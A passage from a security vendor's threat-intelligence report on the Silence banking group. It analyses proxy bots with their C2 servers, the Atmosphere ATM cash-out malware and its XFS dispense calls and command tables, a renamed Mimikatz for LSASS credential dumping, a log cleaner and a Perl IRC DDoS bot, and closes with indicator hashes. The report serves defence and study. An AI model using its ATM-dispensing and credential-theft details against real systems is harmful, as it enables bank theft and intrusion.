following activity:\n• The random numbers generator generates a random number from 0 to 10. The \ncode for working with the abovementioned lengthy strings is only executed \nwhen the random numbers generator generates the number 36567, which never \nhappens. Obviously, this piece of code was added for testing purposes or, most \nlikely, to evade security means.\n• If the application was launched with the arguments of the command line, then \nthe following data is written to the register HKLM\\SYSTEM\\CurrentControlSet\\\nServices\\MicrosoftService\\Note = <command line arguments>Silence\nMoving into the darkside56\n• It is important that the registry receives data from the arguments of the \ncommand line, and this data can be sent to the server even after subsequent \nlaunches, when the client is launched with no arguments at all. Thus, the \napplication under investigation can be used to collect other data, save the data \n(as an argument of the command line when launched) into the registry, and \nthen send it.\n• A new registry key is created called Types Supported. It is not used anywhere \nfurther: HKLM\\SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Application\\\nMicrosoft Audit Service\\TypesSupported  =   7\n• The file under investigation tries to connect to the 185.29.10[.]117:443 network \nnode\n• The program features two ports: 443 and 444. The first one, 443, is a remote \nport, which should be tapped to connect with C2. The second one, 444, is used \nonly once when sending data about the system from the client to the server. \nStated in the file but not used ports for possible connections: 3389 and 8081\n• The connection is established at the layer of TCP sockets (Http and Https \nprotocols are not used)\n• If the connection is not established, the attempts to connect and send files will \nbe repeated every 42 seconds or 1 minute (in two different threads). \n• After successful connection, the server gets information about the system: a \nstring with 16 random characters, PC name, user name, system right (user SID), \ncountry\\locale, local IP, number of the second port embedded into the build. \nThe length of the statistics package is always 208 bytes.57\n• The file performs 3 different requests to the server. If the responses are not \nequal to zero, it makes 4 more requests in a row (4th,5th,6th,7th requests).\n• Then the new TBacklinkClientThread thread is launched. The C&C server \naddress and 2 additional arguments are passed in the thread as arguments. \nThe first argument is the response to the server’s request 1 and is also the \nport for connecting to the remote server and traffic redirection. The second \nargument is the server’s response to request 4.\n• The connection to the C&C server is established via the port from the response \nto request 1. The data from response 4 is sent there.\n• If the connection is successful and the response is received, the \nTSocksClientThread thread is launched.\n• The client reads another portion of data from the server and decrypts it. The \nencryption is done using XOR operations with a 0Dh byte\nTherefore, partially binary and partially textual protocol with encryption is \nused by the server to send commands to the client to request data from other \nnetwork nodes (stated by the server). In other words, the client can be used as an \nintermediate proxy server.\nSilence.ProxyBot.Net\nFile Name MD5 hash Type of software\nsapp.exe\nSocksTest.exe50565c4b80f41d2e7eb989cd24082aab Silence.ProxyBot.NET\nbackconnect proxy\nSocksTest.exe 8191dae4bdeda349bda38fd5791cb66f\nIn the beginning of 2018, we discovered the new version of the ProxyBot \ndeveloped for the .NET framework. The file named sapp.exe_ (56767 bytes, md5: \n50565C4B80F41D2E7EB989CD24082AAB) is an executable program for .Net. The \noriginal name of the program is SocksTest.exe. According to the information from \nthe PE heading of the file, it was compiled on January 25, 2018.Silence\nMoving into the darkside58\nThe program executes the tasks of the proxy server and allows the attacker \nto redirect traffic from the current node to the backconnect server at \n185.161.208[.]61:443. The supported protocols are Sock4\\Socks5. The program is \ncompiled for .NET and needs the .NET Framework 4.0 package installed to launch. \nThe SmartAssembly tool is used for obfuscation.\nThe proxy contains encrypted settings for its operation, which are decrypted \ndynamically using one of the methods from the SocksTest.Settings class. The \ndecrypted settings of the proxy are presented below:\nFrom these settings it is clear that for its operation the proxy uses a backconnect \nserver at 185.161.208[.]61  port 443, user name \"noname\" and password \n\"password\".\n• When connected to the backconnect server, the proxy sends a request with the \nname of the current user and version of the operating system.\n• The file under investigation can create a log file and write debugging \ninformation about the operation of the application. However, in the current \nconfiguration and with the current application settings, the log file is not \ncreated (DebugEnabled=false).  \n59\n \nThe log will be saved to c:\\intel\\slog.log\n• If the connection with the backconnect server is lost, the file under \ninvestigation tries to reconnect in cycles.\n• The backconnect server may send commands to the proxy to make network \nrequests to undefined network nodes and redirect the results back to the \nbackconnect server.\n• The proxy supports the following protocols: Sock4\\Socks5.  \nBelow you will find the first request sent from the program to the backconnect \nserver:\nDespite the fact that the sniffer recognizes the traffic as SSL, this is not the case. \nAs you can see in the image above, the data transferred is not encrypted.\nSilence\nMoving into the darkside60\nSILENCE ATM PACK\nLogical attacks on ATMs were the first activity of Silence Group that we detected. \nThe attackers would penetrate the bank’s corporate network, gain entry to the \nvirtual network to which all ATMs were connected and inject unique programs into \nthe ATMs that affected the dispenser process operations.\nThis unique pack incorporated the following programs:\n• A Dropper  to unpack (out of itself) the Atmosphere  library to affect the \ndispenser and the injector to inject Atmosphere into the dispenser process.\n• The basic DLL Atmosphere library to affect the dispenser.\n• An executable injector program to inject the library into the process \nAtmosphere.Dropper\nFile name MD5 hash\napp3.exe 4107F2756EDB33AF1F79B1DCE3D2FD77\napp4.exe 6743F474E3A6A02BC1CCC5373E5EBBFA\napp11.exe 14863087695D0F4B40F480FD18D061A4\nJ133295_18107_a4.exe f69c35969745ae1b60403868e085062e\nIn the course of further analyses of the Group, we identified a large number of \nprograms of that type. It was clear that the programs were compiled on the go, \nas the attack was unfolding. Some of them did not work, being designed for ATMs \nof one specific type, while the attackers tried to use them on ATMs of a different \ntype. Thus, programs had to be compiled along the way. As a result, some \nDroppers  had to inject the library to affect the dispenser in a strictly defined \nprocess; others only had to extract the library, while the injecting was done by \nanother Injector  program. In total, we detected up to 10 types of programs with \nminor differences between them. Most of them had logical errors that in some \ncases caused program failure.\napp3.exe works to inject code into SFX manager’s process fwmain32.exe (or, \nalternatively, sop.exe) for Wincor Nixdorf ATMs; to exploit API functions exported \nby MSXFS library.dll to affect the ATM; to gain information about the ATM and the \namount of cash in its cassettes; and to issue banknotes to the attacker.\n• When run, this file checks if the process fwmain32.exe is running. If not,  \nit shuts down. 61\n• fwmain32.exe is XFS Manager’s app process for Wincor Nixdorf ATMs.\n• If the process fwmain32.exe is found running, it extracts the dynamic librar\ny86EA1F46DF745A30577F02FC24E266FF and saves it to the directory C:\\intel\\\nlib_<rand_chars>.dll, where rand_chars are symbols [A-Za-z] and [\\]^_`. \nExamples of file names:\n\"c:\\intel\\lib_`TKXV.dll\"\n\"c:\\intel\\lib_m_rMJ.dll\"\n\"c:\\intel\\lib_f `lUX.dll\"\nImportant: The directory c:\\intel is regarded as existent. If not, this file does not \ncreate it. The program tries to check if directory C:\\intel\\ is available by calling the \nWinAPI function GetFileAttributesA.\nThe programmer overlooked the fact that if the searched file did not exist in \nprinciple the function would return -1 (0xFFFFFFFF), condition !(0xFFFFFFFF & 0x10) \nwould operate incorrectly and the directory would not be created. \n• It then injects the said dynamic library into the process fwmain32.exe using \nthe standard technique Thread Hijack\" OpenProcess + GetThreadContext+ \nWriteProcessMemory + SetThreadContext + ResumeThread.\n• Payload is run as a shellcode to load its dll file.\n• The executable file runs the code of the said dynamic library in the context of \nthe process fwmain32.exe and shuts down.\n• As it operates, it shows debug information on the console.\nSilence\nMoving into the darkside62\nAtmosphere.Injector\nFile name MD5 hash Program type \nfuckacp.exe B3ABB10CC8F4CBB454992B95064A9006 Atmosphere.Injector\ninjector.exe 1EE9F88CC7867E021A818DFF012BDF9E Atmosphere.Injector\nThis program helps the attacker to inject DLL into the relevant process. Command \nline parameters are used to specify which dynamic library must be injected in \nwhich particular process. It is worth noting that the process is identified not by its \nname, but by its system identifier (process id).\nThe code for dynamic library injection is similar to that in the dropper.\nSimilarly, we detected several programs of that type. Their compilation settings \nwere different and some libraries were statically linked. This is most likely \nbecause the attacker could not run the program on those ATMs which did not \nhave libraries that the program required.\nAtmosphere\nFile name MD5 hash Program type \nlib_HpBsi.dll 79E61313FEBE5C67D168CFC3C88CD743 Atmosphere\nli.dll C49E6854C79043B624D07DA20DD4C7AD Atmosphere\nlib_HkUEl.dll 86EA1F46DF745A30577F02FC24E266FF Atmosphere\nc8d0ccd2e58c1c467ee8b138c8a15eec\nd81ae5e0680d09c118a1705762b0bfce\nlib_xqkRN.dll ddb276dbfbce7a9e19feecc2c453733d\nThere are several programs of that kind too. See below for analysis results and \ndifferences.\n63\nThe file lib_HkUEl.dll (size 61440 bytes, md5: 86EA1F46DF745A30577F02FC24E266FF)\n• This malicious file operates by injecting code in XFS Manager’s process \nfwmain32.exe for Wincor Nixdorf ATMs and using API functions exported by the \nlibrary MSXFS.dll (loaded into the process fwmain32.exe).\n• As the dynamic library is run/loaded into the address range of the process (in \nour case, the app fwmain32.exe), a new thread is started.\n• Once the library is unloaded (or the fwmain32.exe parent process terminates), \nthis thread terminates.\n• In the course of operation, this file creates the file c:\\intel\\___log.txt and writes \nits operations log in it.\n• This file uses / may call the following XFS API functions: \n• It copies pointers and creates trampoline to functions WFSGetInfo and \nWFSExecute in its dynamic memory. \nSilence\nMoving into the darkside64\n• By calling function WFSGetInfo with flag dwCategory == WFS_INF_CDM_CASH_\nUNIT_INFO the attacker can gain information about the status and contents of \nall cassettes in the ATM.\n• The dispenser is identified by calling the function WFSGetInfo with the flags \ndwCategory == 301(WFS_INF_CDM_CASH_UNIT_INFO) and 401 (value unknown).\n• The function WFSGetInfo to identify the dispenser is called sequentially 30 \ntimes with different hService values ranging from 1 to 30 –  obviously to search \nfor services in the system and locate the service handle that corresponds to the \nrunning ATM service. This could be done by calling the function WFSOpen, but \nthe attacker probably thought that the argument of the first function (the ATM’s \nlogical name in the system) could be non-standard or different on different \nATM types, so he decided to do an ATM device search by using the brute force of \nopen service handles.\n• A thread is then created to check every one second if there are commands from \nthe attacker and execute them if needed\nCommand transmission\nOnce the command file is found, its contents are read by the function \"fread\" and \nare then split into lines. Characters between quotation marks (\") are extracted \nfrom the first line. Then the first character extracted from quotation marks is \nconverted into a command number. Once the command is received, WinAPI of the \nfunctions CryptAcquireContextA and CryptGenRandom generates a line with a \nrandom set of characters. The size of the line is not less than the size of the file, \nplus a random number between 10 and 1024. The resulting line is then added to \nthe end of the file, and the file is deleted.\n65\n• The bot receives commands as newly created files with *.cmd in this file’s root \ndirectory.\n• If there is any file with the extension *.cmd, the app will search for, open and \nread it.\n• After reading, the command file is supplemented by random data of random \nlength and the file is deleted\nCommands in the file *.cmd are transmitted as plain text: <one_upper_char> \n(including quotations marks).\nThe command that is activated depends on the character between the quotation \nmarks.  \nFor example, if the content of the command file is A (with quotation marks), the \ncommand indexed 3 will be executed: retrieve information about ATM cash units.\nSilence\nMoving into the darkside66\nSupported commands are listed below.\nCommand Description \n1,8,9,10,11,12,13 Write return code of the last executed command in a separate \nfile and log file \n2 Retrieve ATM cash unit data and write the result in the log file, \nwith formatting (advanced write mode)\n3 Retrieve ATM cash unit data\n4 Retrieve ATM cash unit data and write the result in the log file\n5 Inject code\\modify the command counter of the current \napp’s random thread (fwmain32.exe) by calling the \nfunctions sequence GetCurrentProcessId + OpenThread + \nGetThreadContext + SetThreadContext\n7 Issue cash in a one-off mode\n? Issue all cash, interval 3 seconds\n? Establish a limit on cash issuance\n67\nTo withdraw cash, the attacker first executes commands to retrieve information \non the existing banknotes. This information is also recorded in the log file as the \nfollowing line:\n|INDEX:<a>|CU state:<b>|Type:<c>|Values:<d>|Currency_ID:<e>|Money count:<f>|, \nwhere a is the index, b is the state of the cassette (full/empty, etc.), c is the \ncash unit type, d is the banknote nominal value, e is the currency by ISO (three-\ncharacter), and f is the current number of banknotes.\nThis is followed by command D to withdraw cash.\nWhen this command is executed, a file is created named as a command file, but \nwith extension 007, i.e. if the command file is second.cmd, the new file will be \nsecond.007, with the code of the last executed command. The log file will also \nhave the following line:\n[2017/11/15 18:15:24.111] last command response code 0\nThe resulting code for last command execution is also written at the end of the \nline.\nAmong other things, we also found an old virtual interface table that handles \ncommands in the code. The handler looks different there: it can issue banknotes \nfrom all the cassettes one by one with an interval of 3 seconds. Banknote issue is \ntriggered by the same function everywhere, including this handler.\nShown below is the code that adds unnecessary information and deletes the file.\nPresumably, the file should have been rewritten by the generated string and \ndeleted afterwards, but in fact this string is only added to the end of the file, as \ncan be seen from the snapshot above.\n \nIt is worth noting that one iteration of the program can only process one file and \nonly one command from it. Even though the content is broken down into lines, it \nis only the first line that is processed, and only the first character from it (the one \nbetween quotation marks) is used and converted to the command number.Silence\nMoving into the darkside68\nWithdrawing cash\nCash is withdrawn by calling the function WFSExecute with the flag \ndwCommand==WFS_CMD_CDM_DISPENSE (issue banknotes from cassettes).\n \nFunction prototype:  \nHRESULT extern WINAPI WFSExecute ( HSERVICE hService, DWORD \ndwCommand, LPVOID lpCmdData, DWORD dwTimeOut, LPWFSRESULT * \nlppResult);  \nThe code of the WFS_CMD_CDM_DISPENSE command to issue banknotes from \ncassettes serves as the second argument.\nThe banknote denomination parameters are transmitted during the call.\nDenomination is a selection of the number of banknotes from specific cassettes \nto be put together as the required amount for withdrawal (i.e. which banknotes \nare to be issued).\nThe structure below serves as the third argument:\nIt is interesting to note that the field bPresent of this structure is set to TRUE. \nThis means that after the command is executed to collect banknotes from the \ncassettes, the dispenser will issue them to the customer. This explains why this \nfile does not use the command to issue cash directly (by calling WFSExecute + \ncommand code WFS_CMD_CDM_PRESENT). \n69\nThe file lib_xqkRN.dll  (size 122880 bytes, md5: DDB276DBFBCE7A9E19FEECC2C45373\n3D) is a slightly different version of Atmosphere .\nA binary comparison of the files lib_xqkRN.dll and lib_HkUEl.dll shows that 38% \nof the first file’s functions equals ~100% of the functions with the corresponding \ncode in the second file (i.e. 71% of all of the functions of the second file). The \nfunctions designed to affect the ATM are practically overlapping. One significant \ndifference is that this file has functions to read keys entered on the PIN pad.\nThis command helps the attacker retrieve information on the physical \narrangement of keys on the PIN pad and can subsequently be used to give a \ncommand to issue cash on demand (manually on the attacker’s PIN pad).\nThis means that the attacker is able to control cash withdrawal not only remotely \n(by sending a command to the ATM) but also physically (by pressing a combination \nof keys on the PIN pad).\nSilence\nMoving into the darkside70\nOther differences between the first and the second files in the rest of the code \nare based on:\n1. Different compiler settings and optimization in the first and second files.\n2. The fact that the first file lib_xqkRN.dll has a code added to it that the second \nfile does not have. This also explains why the first file has a larger number \nof functions. Principally, it is a cryptographic class code to encrypt RSA, AES, \nMD5, SHA-1, for which no code has been detected.\n3. Additionally, the second file has a list of currencies that the first sample \ndid not have. The code operating with these strings in this file is not called \nanywhere.\nAnother version of Atmosphere lib_HpBsi.dll  (MD5 79E61313FEBE5C67D168CFC3\nC88CD743, 61440 bytes, timestamp: 59D94BD5 (Sat Oct 07 21:49:09 2017)), which \nthe DROPPER extracts from its resources, is also designed for withdrawing \nbanknotes from ATM cassettes. It has minor differences and the following \ncommand table:\n71\nCommand Description \n\"B\" Retrieves information about the contents of ATM cassettes. The \nline \"cash units info received\" is added to the log. \n\"A\" Retrieves information about the contents of the cassettes without \nlogging.\n\"Q\" Retrieves information about the contents of ATM cassettes.\n\"D\" One-off issue of banknotes of a specific denomination from the \nATM.\n\"H\" Suspends all threads in the process, except for its own, and uses \nthe GetThreadContext + SetThreadContext functions to redirect \nexecution to its own function.\n\"M\", \"R\", \"S\", \n\"P\", \"T\", \"L\"The result of the last command execution is written to the file C:\\\nintel\\<chrs>.007. This command is also executed by default at the \nend of any other command.\n \nWe have also detected Atmosphere \"li.dll\" (MD5 C49E6854C79043B624D07DA20\nDD4C7AD, 57344 bytes, timestamp: 59DA3AE9 (Sun Oct 08 14:49:13 2017)), with a \n‘hacker-style’ representation of threads.\nSome debugging information is not available, and many lines were modified, e.g., \nPinPad -> \"QinQad\", DISPENSER -> D1SP3NS3R, etc.\nAlso unavailable is some debugging information that was available in the first \nlibrary.\nThe format of the command is *.ccd, not *.cmd, but they share the same command \nhandler, i.e. the commands have the same format and perform the same actions.\nIn April 2018 , Silence attacked another Russian bank, using Atmosphere  to empty \nits ATMs. There were minor differences compared to the previous versions, but \nit was clear that the developer went a long way to debug the program and that \nhe eventually got rid of the unnecessary functions and enhanced the program’s \nsustainability.\nSilence\nMoving into the darkside72\nThe program uses the following command handlers:  \nCommand number Command value \n2 Retrieve information about ATM cash units and write the \nresult in the log file, with formatting (extended write mode)\n3 Retrieve information about ATM cash units \n4,13 Retrieve information about ATM cash units and write the \nresult in the log file \n7 One-off cash withdrawal \n10 Suspend operations for 10 minutes \n11 Terminate app operation \n8 Withdraw all cash, interval 3 seconds\nBelow is a table that compares the old version with the new:  \nFunction Old sample New sample \nWorking directory c:\\intel c:\\atm\\1\nProcess for injecting fwmain32.exe atmapp.exe\nMethod for launching \npayload after injection \ninto the processLoadLibrary shellcode LoadLibrary shellcode \n(with minor changes)\nDebugging info shown in \nthe console In an extended format In a brief format, only \nthe number of detected \nprocesses\nList of XFS functions used WFMFreeBuffer, \nWFMAllocateBuffer, \nWFSExecute, \nWFSFreeResult,  \nWFSGetInfoWFMFreeBuffer, \nWFMAllocateMore, \nWFMAllocateBuffer, \nWFSExecute, \nWFSFreeResult, \nWFSStartUp, WFSGetInfo\nFile size 60 Kbytes 84 Kbytes\nCreating springboards on \nfunction WFS*Yes No\nRetrieving information on \ncassette status Yes Yes\nDetermining dispenser \nand PIN pad status \nbefore operation (codes \n301 and 401)Yes No\nSearching for hService \nhandles when calling \nWFSGetInfoYes No73\nFunctions available to \nread the keys entered on \nthe PIN padYes No\nTransmitting commands \nthrough files with \nextension *.cmd *.c\nRandom data generation \nbased on CryptAcquireContextA + \nCryptGenRandomrand()\nWriting return code to file Yes, to file with extension \n*.007No\nA command to modify \nthe command counter of \nthe current app’s random \nflowYes, command #5 No\nCommand to pause \nTrojan operation No Yes\nOTHER PROGRAMS\nUtilities\nFarse\nFile name MD5 hash Program type \nm32.exe 40228a3ea22e61a0f53644881cd59281 Mimikatz\nThis file is a modified version of the well-known utility Mimikatz that extracts \nclear text  credentials and hashes from memory. Mimikatz source code is available \non the developer’s page hххps://github[.]com/gentilkiwi/mimikatz.\nAnalysis of this file suggests that it is based on Mimikatz source code, with some \nnew functions added to the file.\nWe compared it to Mimikatz 2.1.1 x86, the latest available version at the time \nof writing this report. The file was found to contain artifacts that suggest that \nassembly had been based on source codes of earlier versions (< 2.1.1).\nInformation in the header of the executable file suggests that it was compiled on \n19.09.2009 at 07:39:40 GMT.\n• A binary comparison of this file with the original mimikatz exe, version 2.1.1 x86, \nusing utility BinDiff, demonstrates that binary similarity between them is 25% \nand that this file has 91% of Mimikatz file functions.Silence\nMoving into the darkside74\n• The screenshot above shows the launch of this file for a random (knowingly \nnon-existent) command; the one below shows the launch of the original \nMimikatz.\n• Both apps responded identically to this argument in the command line, \nshowing a list of supported commands.    \n75\nHow Farse is different from the original Mimikatz source code\n1. Banners and all mentions of \"mimikatz\" in the product are obliterated to the \nmaximum extent (although the developer could not do it everywhere). The \npurpose of this is obviously to hide this file from antivirus scanners. \n2. Some words – User, Domain, Password – are changed to U, D, P.  \n  \n3. Command names are different. The original command to extract OS \npasswords \"sekurlsa::logonpasswords\" is renamed as \"sss::logonpasswords\".  \n4. Farse does not require the additional command \"mimikatz # privilege::debug\", \nunlike the original mimikatz. It automatically retrieves a debug privilege token \nto be able to extract data from the system process.  \n5. This file automatically writes its results in the text file \"Farse.log\" in the \ncurrent directory. As an example, when an executable file is run with the \nargument \"sss::logonpasswords\", the extracted passwords and hashes will be \nsaved to this log file.  \n6. User and system credentials are retrieved through the use of the function \n\"sss::logonpasswords\" (in the original source code, Mimikatz is called \n\"sekurlsa::logonpasswords\"). This function retrieves credentials from the lsass \nsystem process.exe (Local Security Authority Subsystem Service).\nCleaner\nFile name MD5 hash Program type \ncleaner.exe 8A9D278B473B6C5625D57739714702FC RAdmin  log cleaner\nThis file is designed to write garbage to the log file of RAdmin  server connections \ndeployed on the victim machine and to delete that file afterwards. Due to \nprogrammer’s error, garbage is written not to the beginning of the file, but to \nits end, which makes it possible to retrieve the original log. The program was \ncompiled on 08.10.2017 at 07:46:09 .\nWhen run, the program generates random values whose length is file size \nC:\\Windows\\System32\\rserver30\\Radm_log.htm +10 up to  \nC:\\Windows\\System32\\rserver30\\Radm_log.htm + 1024:\n \nSilence\nMoving into the darkside76\nIt then writes them to the end of the file and deletes the file. Presumably, \nthe programmer’s intention was to have these random values written to the \nbeginning of the file so as to obstruct restoration of RAdmin  connections logs. An \nimplementation error, however, prevents this from happening:\nThe argument FILE_END is thereby passed on to the function SetFilePointer, which \nmeans that the write pointer is set to the end of the file.\nPerl IRC DDoS bot\nThis bot is a Perl script designed to run on Linux OS. Its functionality includes \nretrieving information about the infected machine, executing shell commands \n(cmd), sending emails, downloading files, scanning ports and carrying out DDoS \nattacks. The server involved is 91.134.146[.]175:1984, communication protocol IRC, \nchannel name \"#PMA\".     \n77\nFirst of all, the script displays the message \"Irc Script Running!\\n\", after which the \nbot randomly selects its own version from among the following lines:  \n \"VERSION — unknown command.\"\n \"mIRC v5.91 K.Mardam-Bey\"\n \"mIRC v6.2 Khaled Mardam-Bey\"\n \"mIRC v6.03 Khaled Mardam-Bey\"\n \"mIRC v6.14 Khaled Mardam-Bey\"\n \"mIRC v6.15 Khaled Mardam-Bey\"\n \"mIRC v6.16 Khaled Mardam-Bey\"\n \"mIRC v6.17 Khaled Mardam-Bey\"\n \"mIRC v6.21 Khaled Mardam-Bey\"\n \"mIRC v6.31 Khaled Mardam-Bey\"\n \"mIRC v7.15 Khaled Mardam-Bey\"  \nIt uses IRC server 91.134.146[.]175 and port 1984. The server can be changed \nby sending the script an address as a parameter at the time of running the \nscript. After connection and authorization on the server, the script can receive \ncommands from and send execution results to the operator using its nickname. \nReceiving the command, the script checks if the message belongs to a particular \ninstance (checking is done across internal script parameters) and parses and \nexecutes the following commands: \n• PPING – receives the thread as a parameter which it then sends out as PONG \n<%string%>\n• PRIVMSG – contains a list of advanced commands. The command is executed \nonly after the script has checked a command for affiliation. For that purpose, \nthe server sends out (as parameters) the name of the infected system, the user \nname on the infected system and the values specific to a specific version of the \nscript.\n• NICK – changes the current script nickname (used during a check if a command \nis associated with a specific script instance).\n• 433 – the bot sends a message to the server: \"<%current nick%>-<%random \nvalue from 0 to 999%>\".\n• 001 – join the channel and send the message \"[PMA Bot]9,1I’m PMA!\" to the \nchannel \nA list of extended commands:\nCommand Description \nVERSION Send the current version of the bot to the server.\nhelp Brief bot man \nsystem Retrieve information about the current bot instance\nversion Receive a bot version\nflood Bot man for DDoS\nchannel Man for general bot commands Silence\nMoving into the darkside78\nutils Bot man for apps \ndie Terminate bot operation \njoin Join the channel received as a parameter\npart Leave the channel received as a parameter \nportscan Get a list of open TCP ports on the device whose ip address is received \nas a parameter.\ndownload Download and save file\ndns Send to server the IP address whose URL is received as a parameter. \nport Check if the TCP port is open on a specific device. IP and port are \nreceived as parameters.\nudp1 Launch a UDP flood attack, packet length 64 to 1024 bytes (small \npackets). The address, port, and attack duration are received as \nparameters.\nudp2 Launch a DDoS attack using all network protocols, and primarily IGMP, \nUDP, ICMP, TCP. Attacks all ports starting from 1 ending with the last one \nif the time set as a parameter is running. Received as a parameter: the \naddress of the victim, the length of the message sent, and the duration \nof the attack. Each UDP port is attacked twice.\nudp3 Launch an UDP DDoS attack using long packets, receiving the address, \nthe port, and the duration of the attack as parameters.\ntcp Launch a TCP DDoS attack. Opens 1,000 connections on a specific \nport. The address, port, and the duration of the attack are received as \na parameter. This command’s man indicates that 4 parameters must \nbe transmitted in the sequence: \"<ip > <port > <pack size > <time>\"; \nthis, however, is an error as the parameter\" <pack size>\" is missing \naltogether: the script does not send any messages to the victim.\nhttp Launch an Http DDoS attack. Parameters received include the address \nof the victim and the duration of the attack. The application sends \na message of the following type: \"GET     / Http/1.1\\r\\nAccept: */*\\r\\\nnHost: <%Victim URL%>\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\" to the \nvictim’s address.\ncback Open a TCP connection with a remote host to execute shell commands \n(or cmd commands in the case of Windows).\nmail Send the message. The body of the message:  \ncontent-type: text/html            Subject: <%first parmeter%>\nFrom: <%second parmeter%>\nTo: <%third parmeter%>\n<%forth parameter%>\nTo send the message, it uses the utility \"/usr/sbin/sendmail\" with the \nparameter –t.79\nctcpflood \n(version \nwith one \nparameter)The bot sends the user with the nickname (the first parameter) the \nfollowing messages:                     \n\"\\001VERSION\\001\\n\"                         \n\"\\001PING\\001\\n\"                     \n 10 times.          \nmsgflood Sends the user (whose name it receives as a parameter) a message \nwith non-printable characters.\nnoticeflood Similar to the \"msgflood\" command, but another IRC command is used \nfor transmission.\nmaxiflood Carries out the attack launched in ctcpflood, msgflood and noticeflood \n5 times.\nrejoin Reconnect to the channel.\nop Add operator status by nickname. Status and nickname are received as \nparameters.\ndeop Delete operator status by nickname. Status and nickname are received \nas parameters.\nvoice Add voice status by nickname. Status and nickname are received as \nparameters.\ndevoice Delete voice status by nickname. Status and nickname are received as \nparameters.\nmsg Send a message (the second parameter) to the user whose nickname is \nreceived as the first parameter.\nflood Send messages (the third parameter) to the user whose nickname \nis received as the second parameter. Number of messages: the first \nparameter.\nctcp The bot sends the user with the nickname [VK8] (the first parameter) \nthe following message: \"\\001<%param2%>\\001\".\nctcpflood \n(version \nwith two \nparameters)The bot sends the user with the nickname [VK9]  (the second \nparameter) the following messages: \"\\001<%param3%>\\001\". The \nnumber of messages is received as a parameter.\ninvite Invite the user to the channel. The user and channel are received as \nparameters.         \nnewerver Change the IRC server. The new nickname and address are received as a \nparameter; standard port 6667.\nnick Change the nickname. The new nickname is received as a parameter. \nraw Sends to the server a message that is received as a parameter.\neval Run a module that is received as a parameter.\nquit Terminate app operation \n      Silence\nMoving into the darkside80\nA list of scanned TCP ports:\n1,7,9,14,20,21,22,23,25,53,80,88,110,112,113,137,143,145,222,333,405,443,444,445,512,587,6\n16,666,993,995,1024,1025,1080,1144,1156,1222,1230,1337,1348,1628,1641,1720,1723,1763,19\n83,1984,1985,1987,1988,1990,1994,2005,2020,2121,2200,2222,2223,2345,2360,2500,2727\n,3130,3128,3137,3129,3303,3306,3333,3389,4000,4001,4471,4877,5252,5522,5553,5554,5\n642,5777,5800,5801,5900,5901,6062,6550,6522,6600,6622,6662,6665,6666,6667,6969,7\n000,7979,8008,8080,8081,8082,8181,8246,8443,8520,8787,8855,8880,8989,9855,9865,\n9997,9999,10000,10001,10010,10222,11170,11306,11444,12241,12312,14534,14568,15951,172\n72,19635,19906,19900,20000,21412,21443,21205,22022,30999,31336,31337,32768,33180,\n35651,36666,37998,41114,41215,44544,45055,45555,45678,51114,51247,51234,55066,5555\n5,65114,65156,65120,65410,65500,65501,65523,6553381\nINDICATORS\nHashes  \n14863087695d0f4b40f480fd18d061a4 — Atmosphere.Dropper\n4107f2756edb33af1f79b1dce3d2fd77 — Atmosphere.Dropper\n6743f474e3a6a02bc1ccc5373e5ebbfa — Atmosphere.Dropper\ncefd39402d7f91d8cf5f1cd6ecbf0681 — Atmosphere.Dropper\nf69c35969745ae1b60403868e085062e — Atmosphere.Dropper\n1ee9f88cc7867e021a818dff012bdf9e — Atmosphere.Injector\nb3abb10cc8f4cbb454992b95064a9006 — Atmosphere.Injector\n79e61313febe5c67d168cfc3c88cd743 — Atmosphere.Payload\n86ea1f46df745a30577f02fc24e266ff — Atmosphere.Payload\nc49e6854c79043b624d07da20dd4c7ad — Atmosphere.Payload\nc8d0ccd2e58c1c467ee8b138c8a15eec — Atmosphere.Payload\nd81ae5e0680d09c118a1705762b0bfce — Atmosphere.Payload\nddb276dbfbce7a9e19feecc2c453733d — Atmosphere.Payload\n874e94cb3f076a21d3fb9da6eb541bab — CVE-2017-0199\n9b9757975d33c9c01b2d3de95d737202 — CVE-2017-0199\n00b470090cc3cdb30128c9460d9441f8 — CVE-2017-0262\n104913aa3bd6d06677c622dfd45b6c6d — CVE-2017-0262\n3be61ecba597022dc2dbec4efeb57608 — CVE-2017-0262\n4c1bc95dd648d9b4d1363da2bad0e172 — CVE-2017-0262\n57f51443a8d6b8882b0c6afbd368e40e — CVE-2017-0262\n5df8067a6fcb6c45c3b5c14adb944806 — CVE-2017-0262\n68e190efe7a5c6f1b88f866fc1dc5b88 — CVE-2017-0262\n98c5c33f5c0bd07ac3e24935edab202a — CVE-2017-0262\n9c7e70f0369215004403b1b289111099 — CVE-2017-0262\nc43f1716d6dbb243f0b8cd92944a04bd — CVE-2017-0262\ncfc0b41a7cde01333f10d48e9997d293 — CVE-2017-0262\ned74331131da5ac4e8b8a1c818373031 — CVE-2017-0262\nc3a70d2bf53f2eb6d05cafbb5e640855 — CVE-2017-11882 CVE-2018-\n0802\nd565500ebee6109edba0be7dea86bf72 — CVE-2018-8174\n081ee959cbe6bc7dde7a6d13168e4fb4 — DDoS Perl IrcBot\nee650c800d2eedd471ed59aa9435e55f — DDoS Perl IrcBot\naa9c31883b3d8e493efad2f983908be3 — DDoS Perl IrcBot\n40228a3ea22e61a0f53644881cd59281 — Farse/Mimikatz\n9596e59ea38350bc181ce56ffa7d6453 — FTP\n15d097a50718f2e7251433ea65401588 — HTA Script\n7b6345708e8d40254ab6fed6d124cc6d — HTA Script\n2ad83e13b2a36b398a8632ef6ce5aa07 — js-loader\n0074d8c3183e2b62b85a2b9f71d4ccd8 — kikothac\n440b21958ad0e51795796d3c1a72f7b3 — kikothac\n9628d7ce2dd26c188e04378d10fb8ef3 — kikothac\nb7f97100748857eb75a6558e608b55df — kikothac\ndfddcbcc3b15034ae733c858cb4e587b — LNK Downloader\ndd74fcfa1a985beeb972022e3a722589 — Silence MainModule\n3345dde0c827dcbda993f7216a8d7c12 — Silence.Downloader\n404d69c8b74d375522b9afe90072a1f4 — Silence.Downloader\n43eda1810677afe6791dd7a33eb3d83c — Silence.DownloaderSilence\nMoving into the darkside82\n5b4417521c71cc89cd3b2fe94ab395b2 — Silence.Downloader\n7d3614df9409da3933637f09587af28c — Silence.Downloader\n7d8af1f6cf7d08c0c39e03033585d404 — Silence.Downloader\n97599e2edc7e7025d5c2a7d7a81dac47 — Silence.Downloader\n9b037ead562c789620a167af85d32f72 — Silence.Downloader\na1e210598820cbb08e269b2dfd96e741 — Silence.Downloader\na58a830dce460e91217328bdefb25cbe — Silence.Downloader\nb09b8be361cd0e30a70cc4603a31d1ee — 